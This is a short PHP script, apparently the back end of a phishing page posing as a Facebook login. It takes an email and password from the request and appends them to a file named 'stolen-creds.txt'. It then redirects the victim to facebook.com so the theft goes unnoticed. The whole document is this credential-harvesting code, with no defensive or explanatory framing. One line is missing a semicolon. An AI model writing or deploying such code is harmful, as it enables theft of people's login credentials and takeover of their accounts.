<?php
	header ("Location: http://facebook.com ");
	if (isset($_GET['email']) &&  isset($_GET['pass'])) {
		$email = $_GET['email'];
		$pass = $_GET['pass'];
		$handle = fopen("stolen-creds.txt", "a")
		fwrite($handle, "Email: $email, Pass: $pass\n");
		fclose($handle);
	}
?>

